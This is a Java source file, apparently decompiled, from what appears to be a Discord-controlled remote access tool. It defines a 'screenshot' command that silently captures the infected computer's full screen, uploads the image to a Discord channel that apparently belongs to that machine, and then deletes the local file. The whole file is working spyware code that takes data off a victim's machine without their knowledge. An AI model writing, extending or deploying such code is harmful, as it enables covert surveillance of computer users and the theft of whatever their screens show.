package me.vasler.command.impl;

import me.vasler.Main;
import me.vasler.command.Command;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.utils.FileUpload;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

public class ScreenshotCommand
extends Command {
    public ScreenshotCommand() {
        super(new String[]{"ss", "screenshot"});
    }

    @Override
    public void run(String[] args, TextChannel channel) throws IOException {
        if (!channel.getName().equalsIgnoreCase(Main.name)) {
            return;
        }
        try {
            Robot r = new Robot();
            Rectangle capture = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage Image2 = r.createScreenCapture(capture);
            ImageIO.write(Image2, "jpg", new File(Main.dir.getAbsolutePath() + "\\save.jpg"));
        }
        catch (Exception r) {
            // empty catch block
        }
        File jpg = new File(Main.dir.getAbsolutePath(), "save.jpg");
        channel.sendFiles(new FileUpload[]{FileUpload.fromData(jpg)}).queue();
        jpg.delete();
    }
}

